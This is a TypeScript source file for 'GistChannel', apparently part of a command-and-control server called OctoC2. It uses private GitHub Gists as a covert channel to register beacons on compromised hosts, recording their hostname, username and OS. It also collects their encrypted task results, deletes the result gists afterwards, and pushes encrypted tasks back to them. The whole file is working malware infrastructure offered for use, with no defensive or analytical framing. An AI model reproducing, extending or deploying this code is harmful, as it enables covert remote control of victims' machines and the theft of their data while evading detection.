/**
 * OctoC2 Server — GistChannel
 *
 * Polls GitHub Gists every pollIntervalMs for beacon activity:
 *   svc-a-{id8}.json  —  Beacon → Server  ACK / registration payload
 *   svc-r-{id8}.json  —  Beacon → Server  Sealed TaskResult blob
 *
 * Delivers pending tasks to gist-registered beacons via:
 *   svc-t-{id8}.json  —  Server → Beacon  Encrypted Task[] blob
 *
 * Crypto:
 *   Incoming results (beacon → server): crypto_box_seal — openSealBox()
 *   Outgoing tasks   (server → beacon): crypto_box      — encryptForBeacon()
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes, bytesToBase64,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

interface GistChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
}

interface AckPayload {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  checkinAt: string;
}

interface ResultPayload {
  taskId:      string;
  beaconId:    string;
  success:     boolean;
  output:      string;
  completedAt: string;
}

export class GistChannel {
  private timer: ReturnType<typeof setInterval> | null = null;

  /** beaconIds that registered via ACK gists (gist-channel beacons) */
  private readonly gistBeacons = new Set<string>();

  /** Gist IDs already processed as ACKs (avoid re-registration) */
  private readonly seenAckGistIds = new Set<string>();

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     GistChannelOpts,
  ) {}

  start(): void {
    if (this.timer) return;
    this.timer = setInterval(() => {
      this.poll().catch(err =>
        console.error("[GistChannel] Poll error:", (err as Error).message)
      );
    }, this.opts.pollIntervalMs);
    console.log("[GistChannel] Started polling");
  }

  stop(): void {
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
      console.log("[GistChannel] Stopped");
    }
  }

  // ── Poll cycle ────────────────────────────────────────────────────────────────

  private async poll(): Promise<void> {
    await this.processAckGists();
    await this.processResultGists();
    await this.deliverPendingTasks();
  }

  // ── ACK gist processing ───────────────────────────────────────────────────────

  private async processAckGists(): Promise<void> {
    let gists: any[];
    try {
      const resp = await this.opts.octokit.rest.gists.list({ per_page: 100 });
      gists = resp.data as any[];
    } catch (err) {
      console.warn("[GistChannel] Failed to list gists:", (err as Error).message);
      return;
    }

    for (const gist of gists) {
      const files: Record<string, any> = gist.files ?? {};
      const ackFile = Object.keys(files).find(f => f.startsWith("svc-a-") && f.endsWith(".json"));
      if (!ackFile) continue;
      if (this.seenAckGistIds.has(gist.id)) continue;
      this.seenAckGistIds.add(gist.id);

      try {
        const fullResp = await this.opts.octokit.rest.gists.get({ gist_id: gist.id });
        const fileEntry = (fullResp.data as any).files?.[ackFile];
        const content = fileEntry?.content ?? "";
        if (!content) continue;

        const ack = JSON.parse(content) as AckPayload;
        if (!ack.beaconId || !ack.publicKey) continue;

        this.registry.register({
          beaconId:    ack.beaconId,
          issueNumber: 0,
          publicKey:   ack.publicKey,
          hostname:    ack.hostname,
          username:    ack.username,
          os:          ack.os,
          arch:        ack.arch,
          seq:         0,
        });
        this.gistBeacons.add(ack.beaconId);

        console.log(`[GistChannel] Registered beacon ${ack.beaconId} from ACK gist`);
      } catch (err) {
        console.warn("[GistChannel] ACK processing error:", (err as Error).message);
      }
    }
  }

  // ── Result gist processing ────────────────────────────────────────────────────

  private async processResultGists(): Promise<void> {
    let gists: any[];
    try {
      const resp = await this.opts.octokit.rest.gists.list({ per_page: 100 });
      gists = resp.data as any[];
    } catch (err) {
      console.warn("[GistChannel] Failed to list gists:", (err as Error).message);
      return;
    }

    for (const gist of gists) {
      const files: Record<string, any> = gist.files ?? {};
      const resultFile = Object.keys(files).find(f => f.startsWith("svc-r-") && f.endsWith(".json"));
      if (!resultFile) continue;

      try {
        const fullResp = await this.opts.octokit.rest.gists.get({ gist_id: gist.id });
        const fileEntry = (fullResp.data as any).files?.[resultFile];
        const sealed = (fileEntry?.content ?? "").trim();
        if (!sealed) continue;

        // Derive operator public key from secret key
        await _sodium.ready;
        const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);

        const plainBytes = await openSealBox(sealed, operatorPublicKey, this.opts.operatorSecretKey);
        const plain = new TextDecoder().decode(plainBytes);
        const result = JSON.parse(plain) as ResultPayload;

        if (result.taskId) {
          this.queue.markCompleted(result.taskId, plain);
          console.log(`[GistChannel] Task ${result.taskId} completed (success=${result.success})`);
        }

        // Delete the result gist
        await this.opts.octokit.rest.gists.delete({ gist_id: gist.id });
      } catch (err) {
        console.warn("[GistChannel] Result processing error:", (err as Error).message);
      }
    }
  }

  // ── Task delivery ─────────────────────────────────────────────────────────────

  private async deliverPendingTasks(): Promise<void> {
    for (const beaconId of this.gistBeacons) {
      const allPending = this.queue.getPendingTasks(beaconId);
      const pending = allPending.filter(
        t => !t.preferredChannel || t.preferredChannel === "gist"
      );
      if (pending.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) continue;

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(pending.map(t => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        const id8 = beaconId.slice(0, 8);
        const taskFilename = `svc-t-${id8}.json`;

        await this.opts.octokit.rest.gists.create({
          public: false,
          files: {
            [taskFilename]: { content: JSON.stringify(encrypted) },
          },
        } as any);

        // Mark tasks as delivered
        for (const t of pending) {
          this.queue.markDelivered(t.taskId);
        }

        console.log(`[GistChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        console.warn(`[GistChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }
}
